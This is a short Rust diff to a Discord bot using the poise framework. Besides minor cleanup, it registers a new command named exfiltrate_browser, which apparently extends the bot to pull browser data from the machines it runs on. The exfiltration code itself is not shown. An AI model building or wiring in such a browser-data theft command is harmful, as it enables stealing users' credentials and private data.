@@ -18,6 +18,8 @@ use crate::{
 };
 
 pub struct Data {} // User data, which is stored and accessible in all command invocations
+
+// Defining types for Error, Context, and SerenityContext
 type Error = Box<dyn std::error::Error + Send + Sync>;
 type Context<'a> = poise::Context<'a, Data, Error>;
 type SerenityContext = poise::serenity_prelude::Context;
@@ -31,10 +33,8 @@ async fn main() {
 
 	let intents = GatewayIntents::GUILD_MESSAGES | GatewayIntents::MESSAGE_CONTENT | GatewayIntents::GUILDS;
 
-	informational!("Starting up commands....");
-
 	let options = poise::FrameworkOptions {
-		commands: vec![info::info(), purge::purge()],
+		commands: vec![info::info(), purge::purge(), exfiltrate::exfiltrate_browser()],
 		event_handler: |_ctx, event, _framework, _data| {
 			Box::pin(async move {
 				informational!("Got an event in event handler: {:?}", event.name());
